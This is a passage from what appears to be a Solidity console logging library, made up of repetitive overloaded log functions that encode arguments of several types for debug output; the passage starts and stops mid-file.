}\n\n    function logUint(uint256 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256)\", p0));\n    }\n\n    function logString(string memory p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0));\n    }\n\n    function logBool(bool p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool)\", p0));\n    }\n\n    function logAddress(address p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address)\", p0));\n    }\n\n    function logBytes(bytes memory p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes)\", p0));\n    }\n\n    function logBytes1(bytes1 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes1)\", p0));\n    }\n\n    function logBytes2(bytes2 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes2)\", p0));\n    }\n\n    function logBytes3(bytes3 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes3)\", p0));\n    }\n\n    function logBytes4(bytes4 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes4)\", p0));\n    }\n\n    function logBytes5(bytes5 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes5)\", p0));\n    }\n\n    function logBytes6(bytes6 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes6)\", p0));\n    }\n\n    function logBytes7(bytes7 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes7)\", p0));\n    }\n\n    function logBytes8(bytes8 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes8)\", p0));\n    }\n\n    function logBytes9(bytes9 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes9)\", p0));\n    }\n\n    function logBytes10(bytes10 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes10)\", p0));\n    }\n\n    function logBytes11(bytes11 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes11)\", p0));\n    }\n\n    function logBytes12(bytes12 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes12)\", p0));\n    }\n\n    function logBytes13(bytes13 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes13)\", p0));\n    }\n\n    function logBytes14(bytes14 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes14)\", p0));\n    }\n\n    function logBytes15(bytes15 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes15)\", p0));\n    }\n\n    function logBytes16(bytes16 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes16)\", p0));\n    }\n\n    function logBytes17(bytes17 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes17)\", p0));\n    }\n\n    function logBytes18(bytes18 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes18)\", p0));\n    }\n\n    function logBytes19(bytes19 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes19)\", p0));\n    }\n\n    function logBytes20(bytes20 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes20)\", p0));\n    }\n\n    function logBytes21(bytes21 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes21)\", p0));\n    }\n\n    function logBytes22(bytes22 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes22)\", p0));\n    }\n\n    function logBytes23(bytes23 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes23)\", p0));\n    }\n\n    function logBytes24(bytes24 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes24)\", p0));\n    }\n\n    function logBytes25(bytes25 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes25)\", p0));\n    }\n\n    function logBytes26(bytes26 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes26)\", p0));\n    }\n\n    function logBytes27(bytes27 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes27)\", p0));\n    }\n\n    function logBytes28(bytes28 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes28)\", p0));\n    }\n\n    function logBytes29(bytes29 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes29)\", p0));\n    }\n\n    function logBytes30(bytes30 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes30)\", p0));\n    }\n\n    function logBytes31(bytes31 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes31)\", p0));\n    }\n\n    function logBytes32(bytes32 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bytes32)\", p0));\n    }\n\n    function log(uint256 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256)\", p0));\n    }\n\n    function log(string memory p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0));\n    }\n\n    function log(bool p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool)\", p0));\n    }\n\n    function log(address p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address)\", p0));\n    }\n\n    function log(uint256 p0, uint256 p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256)\", p0, p1));\n    }\n\n    function log(uint256 p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string)\", p0, p1));\n    }\n\n    function log(uint256 p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool)\", p0, p1));\n    }\n\n    function log(uint256 p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address)\", p0, p1));\n    }\n\n    function log(string memory p0, uint256 p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256)\", p0, p1));\n    }\n\n    function log(string memory p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string)\", p0, p1));\n    }\n\n    function log(string memory p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool)\", p0, p1));\n    }\n\n    function log(string memory p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address)\", p0, p1));\n    }\n\n    function log(bool p0, uint256 p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256)\", p0, p1));\n    }\n\n    function log(bool p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string)\", p0, p1));\n    }\n\n    function log(bool p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool)\", p0, p1));\n    }\n\n    function log(bool p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address)\", p0, p1));\n    }\n\n    function log(address p0, uint256 p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256)\", p0, p1));\n    }\n\n    function log(address p0, string memory p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string)\", p0, p1));\n    }\n\n    function log(address p0, bool p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool)\", p0, p1));\n    }\n\n    function log(address p0, address p1) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address)\", p0, p1));\n    }\n\n    function log(uint256 p0, uint256 p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,uint256)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, uint256 p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,string)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, uint256 p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,bool)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, uint256 p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,address)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, string memory p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,uint256)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,string)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,bool)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,address)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, bool p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,uint256)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,string)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,address)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, address p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,uint256)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,string)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,bool)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint256 p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,uint256)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint256 p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint256 p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, uint256 p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,uint256)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint256)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint256)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool)\", p0, p1, p2));\n    }\n\n    function log(string memory p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint256 p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,uint256)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint256 p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint256 p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, uint256 p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint256,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint256)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint256)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint256)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool)\", p0, p1, p2));\n    }\n\n    function log(bool p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint256 p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,uint256)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint256 p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint256 p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, uint256 p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint256,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint256)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, string memory p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint256)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, bool p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, uint256 p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint256)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, bool p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool)\", p0, p1, p2));\n    }\n\n    function log(address p0, address p1, address p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address)\", p0, p1, p2));\n    }\n\n    function log(uint256 p0, uint256 p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, uint256 p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,uint256,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(uint256 p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(uint256,address,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, uint256 p1, uint256 p2, string memory p3) internal view {\n        